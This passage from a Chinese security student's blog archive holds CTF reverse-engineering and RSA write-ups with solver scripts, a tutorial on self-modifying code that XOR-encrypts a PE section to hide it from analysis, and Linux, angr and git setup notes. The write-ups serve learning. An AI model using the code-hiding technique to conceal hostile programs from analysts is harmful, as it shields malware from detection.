\u0026lt;\u0026lt; 46)) | ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) \u0026amp; (flag[5] \u0026gt;\u0026gt; 18)); flag[6] = flag[7] \u0026amp; ~(((flag[6] \u0026lt;\u0026lt; 40) \u0026amp; ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) | ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) \u0026amp; (flag[6] \u0026gt;\u0026gt; 24)) \u0026amp; flag[7]) | ~(((flag[6] \u0026lt;\u0026lt; 40) \u0026amp; ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) | ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) \u0026amp; (flag[6] \u0026gt;\u0026gt; 24)) \u0026amp; flag[7]) \u0026amp; ((flag[6] \u0026lt;\u0026lt; 40) \u0026amp; ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) | ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) \u0026amp; (flag[6] \u0026gt;\u0026gt; 24)); flag[7] = *flag \u0026amp; ~(((flag[7] \u0026lt;\u0026lt; 34) \u0026amp; ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) | ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) \u0026amp; (flag[7] \u0026gt;\u0026gt; 30)) \u0026amp; *flag) | ~(((flag[7] \u0026lt;\u0026lt; 34) \u0026amp; ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) | ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) \u0026amp; (flag[7] \u0026gt;\u0026gt; 30)) \u0026amp; *flag) \u0026amp; ((flag[7] \u0026lt;\u0026lt; 34) \u0026amp; ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) | ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) \u0026amp; (flag[7] \u0026gt;\u0026gt; 30)); v6 = 1; } 但是我们把每一个算式拆成下面的形式：\na = flag\u0026lt;\u0026lt;n1 b = flag\u0026gt;\u0026gt;n2 *flag = flag[1] \u0026amp; ~((a \u0026amp; ~(b \u0026amp; a) | ~(b \u0026amp; a) \u0026amp; b) \u0026amp; flag[1]) | ~((a \u0026amp; ~(b \u0026amp; a) | ~(b \u0026amp; a) \u0026amp; b) \u0026amp; flag[1]) \u0026amp; (a \u0026amp; ~(b \u0026amp; a) | ~(b \u0026amp; a) \u0026amp; b); 可以发现(a \u0026amp; ~(b \u0026amp; a) | ~(b \u0026amp; a) \u0026amp; b)是作为一个整体出现的，得到的结果就是 a^b 的值 化简后\n*flag = flag[1] \u0026amp; ~((a^b)\u0026amp; flag[1]) | ~((a^b) \u0026amp; flag[1]) \u0026amp; (a^b);\n又发现整个算式就是刚才的那个结构，于是把加密进行简化为\nflag[0]=(a^b)^flag[1]\n再加之a和b的两个位移指正好是64，这样就可以开始逆了\nDemo: # import hashlib l = [0x08CD53D0EAE56FDE,0xE0310C8244BA1FA3,0x45B42002CE1B213D,0x16FDC411224CB2DF,0x2FD8108A59461BCC,0x8F6990725EB01982,0x9BA5ADE29A2A17D8,0x4DEAA99F5D9F6605] n1 = [] n2 = [] for i in range(64): l[7] = ((l[7] ^ l[0]) \u0026gt;\u0026gt; 34) \u0026amp; 0xffffffffffffffff ^ (((l[7] ^ l[0])) \u0026lt;\u0026lt; 30) \u0026amp; 0xffffffffffffffff l[6] = ((l[6] ^ l[7]) \u0026gt;\u0026gt; 40) \u0026amp; 0xffffffffffffffff ^ (((l[6] ^ l[7])) \u0026lt;\u0026lt; 24) \u0026amp; 0xffffffffffffffff l[5] = ((l[5] ^ l[6]) \u0026gt;\u0026gt; 46) \u0026amp; 0xffffffffffffffff ^ (((l[5] ^ l[6])) \u0026lt;\u0026lt; 18) \u0026amp; 0xffffffffffffffff l[4] = ((l[4] ^ l[5]) \u0026gt;\u0026gt; 52) \u0026amp; 0xffffffffffffffff ^ (((l[4] ^ l[5])) \u0026lt;\u0026lt; 12) \u0026amp; 0xffffffffffffffff l[3] = ((l[3] ^ l[4]) \u0026gt;\u0026gt; 58) \u0026amp; 0xffffffffffffffff ^ (((l[3] ^ l[4])) \u0026lt;\u0026lt; 6) \u0026amp; 0xffffffffffffffff l[2] = ((l[2] ^ l[3]) \u0026gt;\u0026gt; 16) \u0026amp; 0xffffffffffffffff ^ (((l[2] ^ l[3])) \u0026lt;\u0026lt; 48) \u0026amp; 0xffffffffffffffff l[1] = ((l[1] ^ l[2]) \u0026gt;\u0026gt; 22) \u0026amp; 0xffffffffffffffff ^ (((l[1] ^ l[2])) \u0026lt;\u0026lt; 42) \u0026amp; 0xffffffffffffffff l[0] = ((l[0] ^ l[1]) \u0026gt;\u0026gt; 28) \u0026amp; 0xffffffffffffffff ^ (((l[0] ^ l[1])) \u0026lt;\u0026lt; 36) \u0026amp; 0xffffffffffffffff s=\u0026#39;\u0026#39; for i in l: t = i while t\u0026gt;0: s+=chr(t%0x100) t = t//0x100 flag =\u0026#39;\u0026#39; s1 = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39; s2 = \u0026#39;456789+/YZabcdefopqrstuvwxyz0123ghijklmnABCDEFGHQRSTUVWXIJKLMNOP\u0026#39; for i in s1: flag += s[s2.find(i)] print(flag) # easy_logical_algorithm_for_freshman_and_try_to_slove_it_yourself m=hashlib.md5() m.update(bytes(flag,encoding=\u0026#34;utf-8\u0026#34;)) print(m.hexdigest().upper()) #A6FFB35FEF107F2A0DAAE19BCD7B2297 其实在看到加密部分只有与、或、非的时候就应该往与、或、非实现异或的方向想了，因为没有加减乘除的参与，单纯的与、或、非很难把flag逆回来\nPy2 # pyc文件很完整,可以直接用工具反出来,拿到源码是这样的\ndemo： # #! /usr/bin/env python 2.7 (62211) #coding=utf-8 # Compiled at: 2020-04-23 03:22:50 #Powered by BugScaner #http://tools.bugscaner.com/ #如果觉得不错,请分享给你朋友使用吧! import ctypes from base64 import b64encode, b64decode def decode(): fd = open(\u0026#39;./libc.so\u0026#39;, \u0026#39;rb\u0026#39;) data = fd.read() fd.close() print(123) fd = open(\u0026#39;./libc.so\u0026#39;, \u0026#39;wb\u0026#39;) fd.write(b64decode(data)) fd.close() def check(): if b64encode(pwd) == \u0026#39;YmpkMw==\u0026#39;: # bjd3 decode() dl = ctypes.cdll.LoadLibrary lib = dl(\u0026#39;./libc.so\u0026#39;) reply = lib.check reply(int(flag[:length // 2], 16), int(flag[length // 2:], 16), int(pwd.encode(\u0026#39;hex\u0026#39;), 16)) print \u0026#39;your input is BJD\u0026#39; flag.decode(\u0026#39;hex\u0026#39;) else: print \u0026#39;your password is wrong!\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: print \u0026#39;Please input your flag:\u0026#39; flag = raw_input() flag = flag.encode(\u0026#39;hex\u0026#39;) length = len(flag) print \u0026#39;Please input your password:\u0026#39; pwd = raw_input() check() #decode() 分析一下流程可以发现代码调用了 libc.so 动态链接库里面的cheak函数进行加密\npy源码好就好在可以对流程随意修改,我们让程序对文件解base64后得到 libc.so里面的cheak函数是长这样的\ncheak函数 # v3 = a1; v7 = a2; v6 = a2; v5 = a2; v4 = a2; code((unsigned __int64 *)\u0026amp;v3, \u0026amp;v4); if ( v3 == __PAIR128__(0xD760262509C2F6D0LL, 0xAF9D869B6947017DLL) ) puts(\u0026#34;you win!\u0026#34;); else puts(\u0026#34;you failed!\u0026#34;); code函数: # v4 = *a1; v5 = a1[1]; sum = 0LL; v7 = 32LL; while ( 1 ) { v2 = v7--; if ( !v2 ) break; sum += 0x9E3779B9LL; v4 += (v5 + sum) ^ (16 * v5 + *key) ^ ((v5 \u0026gt;\u0026gt; 5) + key[1]); v5 += (v4 + sum) ^ (16 * v4 + key[2]) ^ ((v4 \u0026gt;\u0026gt; 5) + key[3]); } *a1 = v4; code函数内是标准的tea加密,早知道加密方式这么简单我就先来做py2了。。。\n但是反出来的这行代码又很奇怪if ( v3 == __PAIR128__(0xD760262509C2F6D0LL, 0xAF9D869B6947017DLL) )于是干脆看汇编确定判断时的细节\n可以确定\n0xAF9D869B6947017D,0xD760262509C2F6D0\n对应第1、2个flag\ntea的解密脚本很好写，但是要注意题目用的是64位int\nexp: # #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;iomanip\u0026gt; using namespace std; void decrypt(unsigned __int64 *v, unsigned __int64 *k) { unsigned __int64 v4 = v[0], v5 = v[1], v2 = v[2], v3 = v[3], sum = 0; unsigned __int64 k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (int i = 0; i \u0026lt; 32; i++) { sum += 0x9E3779B9; } for (int i = 0; i \u0026lt; 32; i++) { v5 -= ((v4 * 16) + k2) ^ (v4 + sum) ^ ((v4 \u0026gt;\u0026gt; 5) + k3); v4 -= ((v5 * 16) + k0) ^ (v5 + sum) ^ ((v5 \u0026gt;\u0026gt; 5) + k1); sum -= 0x9E3779B9; } v[0] = v4; v[1] = v5; } int main() { unsigned __int64 flag[2] = { 0xAF9D869B6947017D,0xD760262509C2F6D0}; unsigned __int64 key[4] = {0x626a6433, 0x626a6433, 0x626a6433, 0x626a6433}; decrypt(flag, key); for (auto \u0026amp;\u0026amp;i : flag) { cout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; i\u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } //676f745f //74656121 把结果转成字符串\ngot_tea!\n这几个re除了两个misc确实难度感觉都比较适中。。。应该把所有题都看一遍的\n","date":"26 May 2020","permalink":"/achieve/2019to2021/dasctf-2020-5/","section":"archive","summary":"我就是铁废物了，整场比赛只做出来两个题","title":"安恒五月赛-2020-re部分"},{"content":"\rVC6实现SMC动态代码加密技术 # 自己做re经常碰到smc，折腾久了也会手痒痒自己弄一个，算是对PE结构的巩固。。。技术本身也不太难懂，折腾完发现也没弄出啥有技术含量的东西，就算作学习加密技术的一个开端吧\n预备知识： # pe结构\nC语言功底\n添加区块： # 相对汇编编写smc，C语言编写smc一大缺点就是难以准确定位到某个函数，所以要用到添加段的操作，以区块为加密单位，所以讲要加密的代码放到一个新区块中\n#pragma code_seg(\u0026#34;.SMC\u0026#34;) void fun() {\tputs(\u0026#34;You got my secrets =.= \\n\u0026#34;); } #pragma code_seg() #pragma comment(linker, \u0026#34;/SECTION:.SMC,ERW\u0026#34;) #pragma code_seg(\u0026quot;.SMC\u0026quot;) 表示将代码放入 .SMC 段中\n后面还要跟一个 #pragma code_seg( ) 是为了把其余代码放入原本的段中\n#pragma comment(linker, \u0026ldquo;/SECTION:.SMC,ERW\u0026rdquo;) 设置段的属性位可读写，没有这一步也可以用 VirtualProtect 进行修改\n运行程序应该看到fun()是可以正常运行的,若使用 vs20xx 可能需要修改一下编译的设置才能成功生成新段\n定位区块： # 首先需要定位到镜像文件的基址\nHMODULE pBuf = GetModuleHandle(0); 通过基找到程序的 DOS 头(PIMAGE_DOS_HEADER 类型)，再通过 DOS 头找到 PE 文件头(PIMAGE_NT_HEADERS32 类型)：\npDH = (PIMAGE_DOS_HEADER)pBuf; pNtH = (PIMAGE_NT_HEADERS32)((DWORD)pBuf + pDH-\u0026gt;e_lfanew); 利用 PE 文件头找到第一个段和段的总数：\nSnum = pNtH-\u0026gt;FileHeader.NumberOfSections; pSH = IMAGE_FIRST_SECTION(pNtH); 通过遍历每 Snum 个段对比段的 name 就可以定位到想要的段了。\n集合上述方法编写了一个查找指定区段的函数：\nPIMAGE_SECTION_HEADER get_SH(char s[]) { char name[10]; int Snum; HMODULE pBase = GetModuleHandle(0); PIMAGE_DOS_HEADER pDH; PIMAGE_NT_HEADERS pNtH; PIMAGE_SECTION_HEADER pSH; pDH = (PIMAGE_DOS_HEADER)pBase; pNtH = (PIMAGE_NT_HEADERS32)((DWORD)pBase + pDH-\u0026gt;e_lfanew); Snum = pNtH-\u0026gt;FileHeader.NumberOfSections; pSH = IMAGE_FIRST_SECTION(pNtH); for(int i = 0;i\u0026lt;Snum;i++) { memset(name,0,sizeof(name)); memcpy(name,pSH-\u0026gt;Name,8); if(strcmp(name,s)==0) return pSH; pSH++; } cout\u0026lt;\u0026lt;\u0026#34;sth worry!\\n\u0026#34;; system(\u0026#34;pause\u0026#34;); return pSH; } 对代码进行操作： # 对代码的操作有一点麻烦，用上面得到的目标段得到段首的偏移再加上映像文件的基址得到定位到真正的段首地址。\n然后先把代码开始的位置转成一个 void 类型的指针，再把数据转成 BYTE 类型输出。\nvoid axor(void *soure,int len,int key) {\tprintf(\u0026#34;读取数据：\\n\u0026#34;); for(int i=0;i\u0026lt;len;i++) printf(\u0026#34;%X\\n\u0026#34;,*((BYTE*)soure+i));//*((BYTE*)soure+i) = *((BYTE*)soure+i) ^ key; }//段操作函数 . . . . void *Start = GetModuleHandle(0) + SH-\u0026gt;VirtualAddress; int size = SH-\u0026gt;SizeOfRawData; axor( soure, size, 4396)；//代码长度可能只占段很小一部分,所以 size 的值视情况而定 打印出来颇有一种一位位读取机器码的效果。\n编写赋值语句尝试对机器码的值进行修改，动调查看流程确认无误后加入 key 对代码进行加密\nvoid axor(void *soure,int len,int key {\tfor(int i=0;i\u0026lt;len;i++) *((BYTE*)soure+i) = *((BYTE*)soure+i) ^ key; } 利用异或以外的加密方式可以提高 smc 的威力\n把各个步骤整合到一起，编译\n但是编译好的代码并没有对敏感代码进行加密，于是我们还需要直接对生成好的 pe 文件动刀，方法也很简单，只有找到位置一个个 BYTE 改就ok了，这里我做了一个读取文件的 demo ，因为代码不太长，所以试了试直接用 winhex 一位位抠也是可行的。。。。\n最后把写好的程序放在这里：\rsmc1 密码是：2077 smc 还是要配合上其他加密算法和保护手段才能发挥其真正威力，回头看自己折腾出来的代码总觉得很幼稚。。。\n参考资料： # 《加密与解密 第四版》11章 https://bbs.pediy.com/thread-201708.htm https://blog.csdn.net/orbit/article/details/1497457\n","date":"9 May 2020","permalink":"/achieve/2019to2021/%E4%B8%80%E6%AC%A1smc%E7%9A%84%E5%AE%9E%E7%8E%B0/","section":"archive","summary":"VC6实现SMC动态代码加密技术 # 自己做re经常碰到smc，折腾久了也会手痒痒自己弄一个，算是对PE结构的巩固。。。技术本身也不太难懂，折腾完发现也没弄出啥有技术含量的东西，就算作学习加密技术的一个开端吧","title":"一次SMC的实现"},{"content":"\r一些（最近用到的）常用指令： # 没事不想用vim : (\nls -i详细信息显示 [路径(默认当前目录)] -a隐藏文件显示 -h大小按kb显示 A*.txt 搜索A开头.txt结尾的文件 #对文件： mv 1 1.txt #1 改为 1.txt #对文件夹： mv fld fld2#若fld2存在则移动fld到fld2下，否则改名为fld2 whereis xxxxx #查找文件位置 vim [文件名] 命令(一般)模式下： i #进入编辑模式 shift + `：`#打开底部命令行 / #按下后输入字符串可以匹配字符串 gg #回第一行 shift + x #类似windows的backspace dd #行消除 yy #复制本行 shift + p #粘贴在光标上一行 p #粘贴在光标下一行 u #类似ctrl + z [输入数字n] + 回车 #向下跳n行 ctrl f#对应uppage ctrl b#对应downpage #多行注释 ctrl + v --\u0026gt; 选择多行并shift + i--\u0026gt; 输入字符回车---\u0026gt;字符会复制到选择起来的所有行前面 如果输入`#`或者`//`可以达到多行注释的效果 底部命令模式： ESC回到命令（一般）模式 q 退出 w 保存 q！强制退出不保存 w！强制保存 1,s/A/B/gc #从第一行开始找 A 并询问是否换成 B 询问选项：y yes n next a 光标以下的all （可能很有用） q quit 编辑模式： inster #在替换和插入之间切换 添加环境变量： export PATH=[path] //不需要括号和引号 如：export PATH=$PATH:/mnt/c/Users/16953/bin/ sudo password root//重置密码 sudo -i//切换至sudo用户 chmod 777 file//权限拉满 chmod 000 file//权限全关 abc a:User b:Group c:Other 权限选项： r：读 w：写 x：执行 ubuntu config --default-user root 设置默认用户以为root w who 当前**在登陆**用户 whoami 查询当前用户 cat /etc/passwd 查看所有用户，但是很丑 lastlog 比上面那个好看一些 apt-get update // 更新安装源（Source） apt-get upgrade // 更新已安装的软件包 dist-upgrade //更新依赖 apt-cache search PackageName // 搜索软件包 ","date":"8 May 2020","permalink":"/achieve/2019to2021/%E4%B8%80%E4%BA%9Blinux%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/","section":"archive","summary":"一些（最近用到的）常用指令： # 没事不想用vim : (","title":"一些linux常用指令"},{"content":"\r在wsl上安装angr框架 # 折腾了好几天终于是把这套东西给折腾完了，windows上折腾一天最后还是无法解决报错，干脆按在了wsl上。就把从头到尾踩过的坑全部拿出来写一下好了\n先检查新装好的 wsl 有没有安装 pip ，没有的话系统会提示用apt安装。\n安装 virtualenv： # pip3 install virtualenv 在python开发中，我们可能会遇到一种情况，就是当前的项目依赖的是某一个版本，但是另一个项目依赖的是另一个版本，这样就会造成依赖冲突，而virtualenv就是解决这种情况的，virtualenv通过创建一个虚拟化的python运行环境，将我们所需的依赖安装进去的，不同项目之间相互不干扰，如下所示。\n意思就是说angr会影响python的环境所以要新建一个独立的python环境（具体是一个文件夹）\n先新建到一个angr专用文件夹：\nljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953$ mkdir angr_enviroment ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953$ cd angr_enviroment/ 新建一个 python 独立运行环境： # virtualenv -p python位置 myenv python位置这样获得：\nljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953$ whereis python python: /usr/bin/python3.6 /usr/bin/python3.6-config /usr/bin/python3.6m /usr/bin/python3.6m-config /usr/lib/python2.7 /usr/lib/python3.6 /usr/lib/python3.7 /usr/lib/python3.8 /etc/python3.6 /usr/local/lib/python3.6 /usr/include/python3.6 /usr/include/python3.6m /usr/share/python /mnt/c/Program Files (x86)/NetSarang/Xshell 6/python34.dll /mnt/c/Program Files (x86)/NetSarang/Xshell 6/python34.zip /mnt/c/py374/python.pdb /mnt/c/py374/python3.dll /mnt/c/py374/python3.exe /mnt/c/py374/python37.dll /mnt/c/py374/python37.pdb /mnt/c/Windows/system32/python27.dll /mnt/c/p27/python2.exe /mnt/c/Users/16953/AppData/Local/Microsoft/WindowsApps/python.exe /mnt/c/Users/16953/AppData/Local/Microsoft/WindowsApps/python3.exe ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953$ 复制粘贴第一个/usr/bin/python3.6\n具体位置可能会有差异\n运行：ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ virtualenv -p /usr/bin/python3.6 myenv\n应该可以用windows资源管理器在angr_enviroment文件夹下看的一个新建的myenv文件夹，\n安装angr： # #启动环境 ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ source myenv/bin/activate #安装angr (myenv) ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ pip3 install angr 。 。 安 装 中 。 。 (myenv) ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ python3 Python 3.6.9 (default, Apr 18 2020, 01:56:04) [GCC 8.4.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import angr \u0026gt;\u0026gt;\u0026gt; #未报错则成功 #关闭环境 (myenv) ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ deactivate ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ 之后要使用angr的时候也要开启环境所以尽量装在wsl初始化界面附近\n对python虚拟环境的一点点解释：（感觉其实就是备份了一个拿来给特定应用折腾）\n针对每个应用创建独立运行的python环境，这样就可以对每个应用的pyhton环境进行隔离。原理就是把系统python复制一份到virtualenv的环境，用命令source venv/bin/activate进入一个virtualenv环境的时候，virtualenv会修改相关的环境变量，让命令python和pip均指向当前的virtualenv环境。这个时候命令提示符号就变了，前面有一个（venv)前缀 :3\n","date":"8 May 2020","permalink":"/achieve/2019to2021/wsl%E5%AE%89%E8%A3%85angr/","section":"archive","summary":"在wsl上安装angr框架 # 折腾了好几天终于是把这套东西给折腾完了，windows上折腾一天最后还是无法解决报错，干脆按在了wsl上。就把从头到尾踩过的坑全部拿出来写一下好了","title":"wsl安装angr"},{"content":"\r被一个很坑爹的问题折腾了一天-解决git下载速度过慢 # 碰到的问题都是比较个例的，所以才会放在博客\n几种常见的解决方案： # 1. 更改hosts文件： # 进入这个网站\r查询以下网址的 ip\ngithub.com github.global.ssl.fastly.net codeload.github.com 用cmd指令 ping 一下ip\nping xxx.xxx.xxx.xxx 如果ping得通就按以下格式添加到hosts文件中\nhosts文件位置：C:\\Windows\\System32\\drivers\\etc\n像这样：\n# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a \u0026#39;#\u0026#39; symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a \u0026#39;#\u0026#39; symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 140.82.114.4 github.com 199.232.69.194 github.global.ssl.fastly.net 140.82.112.9 codeload.github.com #以下网址可有可无 185.199.108.153 assets-cdn.github.com 199.232.68.133 raw.githubusercontent.com 199.232.68.133 cloud.githubusercontent.com 199.232.68.133 camo.githubusercontent.com 199.232.68.133 avatars0.githubusercontent.com 199.232.68.133 avatars1.githubusercontent.com 199.232.68.133 avatars2.githubusercontent.com 199.232.68.133 avatars3.githubusercontent.com 199.232.68.133 avatars4.githubusercontent.com 199.232.68.133 avatars5.githubusercontent.com 199.232.68.133 avatars6.githubusercontent.com 199.232.68.133 avatars7.githubusercontent.com 199.232.68.133 avatars8.githubusercontent.com 执行ipconfig /flushdns命令，刷新 DNS 缓存\n2. 修改代理（较为有效）： # 首先查看gitconfig文件是否已经有其他代理：\n位置：C:\\Users\\xxxxx\\.gitconfig\n[user] email = 1695325350@qq.com name = ljahum #把这行字以下的设置全部注释掉 #[http \u0026#34;https://github.com\u0026#34;] # proxy = https://127.0.0.1:1086 #[https \u0026#34;https://github.com\u0026#34;] # proxy = https://127.0.0.1:10863 #[http \u0026#34;http://github.com\u0026#34;] # proxy = http://127.0.0.1:10808 #[http \u0026#34;https://github.com\u0026#34;] # proxy = http://127.0.0.1:10808 [http] proxy = socks5://127.0.0.1:4781 [https] proxy = socks5://127.0.0.1:4781 动动小手打开 vpn 查看 http(s) 端口和 socks 端口的值\n注意如果租的梯子一定要到卖家哪里更新客户端再查看\n按以下格式写入 .gitconfig 中：\n[http] proxy = socks5://127.0.0.1:[socks 端口的值] [https] proxy = socks5://127.0.0.1:[socks 端口的值] 也可以改成http（s）的那种，最终效果如下：\n[user] #用户名与邮箱，不用管 email = 1695325350@qq.com name = ljahum #socks5: [http] proxy = socks5://127.0.0.1:4781 [https] proxy = socks5://127.0.0.1:4781 #http(s): [http] proxy = 127.0.0.1:4780 [https] proxy = 127.0.0.1:4780 3. 把所需的库搬到gitee上 # 教程很多就不写了,网上到处都是，缺点是有些东西在安装的时候会访问github的库。\n作为个人或者团队之间的仓库快的飞起。\n","date":"7 May 2020","permalink":"/achieve/2019to2021/git%E4%BB%A3%E7%90%86%E9%97%AE%E9%A2%98/","section":"archive","summary":"被一个很坑爹的问题折腾了一天-解决git下载速度过慢 # 碰到的问题都是比较个例的，所以才会放在博客","title":"Git代理问题"},{"content":"\r题目： # p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 已知 dq，dp，q，p，c，求 m ，一个中国剩余定理扩展的题，原理咱也不太懂，用就完事了\n证明过程： # 已知： d = dp mod (p-1) d = dq mod (q-1) 令： m1 = cd mod p m2 = cd mod q 有：cd = kp + m1 故：m2 = ( kp + m1 ）mod q \u0026ndash;\u0026gt; m2 - m1 = k*p mod q\n取 p 逆模 ： ( m2 - m1 ) * p-1 = k mod q\nk = ( m2 - m1 ) * p-1 mod q \u0026mdash;-\u0026gt; k = ( k1 * q + [ ( m2 - m1 ) * p-1 mod q ] ) cd = k*p + m1 cd = ( k1 * q + [ ( m2 - m1 ) * p-1 mod q ] ) * p + m1 cd = k1 * q *p + [ ( m2 - m1 ) * p-1 mod q ] * p + m1\nm = cd mod n = { k1 * q p + [ ( m2 - m1 ) * p-1 mod q ] * p + m1 } mod n (n = pq)\n故：m = { [ ( m2 - m1 ) * p-1 mod q ] * p + m1 } mod n —— ①\nd = k*( p-1 ) + dp\n故：cd = ck*( p-1 ) + dp\nm1 = cd mod p = ck*( p-1 ) + dp mod p\n由于 费马小定理 :\nm1 = c dp mod p\n同理 ：m2 = c dq mod q\nexp： # import libnum import Crypto.Util.number p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 invq=libnum.invmod(p,q) mp=pow(c,dp,p) mq=pow(c,dq,q) m=((mp-mq)*invq%p)*q+mq print(libnum.n2s(m)) #noxCTF{W31c0m3_70_Ch1n470wn} 证明过程用了模运算的一些特性，掌握模运算性质的话还是比较简单的。。。。\n","date":"8 April 2020","permalink":"/achieve/2019to2021/buuctf-rsa1/","section":"archive","summary":"题目： # p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 已知 dq，dp，q，p，c，求 m ，一个中国剩余定理扩展的题，原理咱也不太懂，用就完事了","title":"buuctf-rsa1"},{"content":"\rSymPy中数论部分使用说明 # sympy是一个Python的科学计算库，用一套强大的符号计算体系完成诸如多项式求值、求极限、解方程、求积分、微分方程、级数展开、矩阵运算等等计算问题 :D\nsympy.factorint\nlist(sympy.sieve.primerange(数字1,数字2))列出大于等于数字1，小于数字2的所有素数\nsympy.prime(n)返回第n个素数\nsympy.isprime(n)素性检测\nsympy.primepi(n)返回小于n的素数的总数\nsympy.nextprime(89)返回下一个素数，这里结果是97\nsympy.prevprime(96)或sympy.prevprime(97)返回上一个素数，结果都是89\nsympy.randprime(1,30)返回1到30之间的一个大于等于1小于30的随机素数 range [a, b)\nsympy.primorial \u0026gt;\u0026gt;\u0026gt; primorial(4) # the first 4 primes are 2, 3, 5, 7 210 \u0026gt;\u0026gt;\u0026gt; primorial(4, nth=False) # primes \u0026lt;= 4 are 2 and 3 6 libnum库 # 大体功能和 sympy 比较相似，python3.7+的小伙伴可以用这个\nhas_invmod (e，n)检测是否有逆模\nd = invmod (e, n) 求逆模，满足关系 d * e = 1 mod n (gmpy2.invert)\ngcd(a, b) 求两数最大公约数(欧几里得算法)\nxgcd(a, b) 扩展欧几里得 返回（x，y，g）：a * x + b * y = gcd（a，b）= 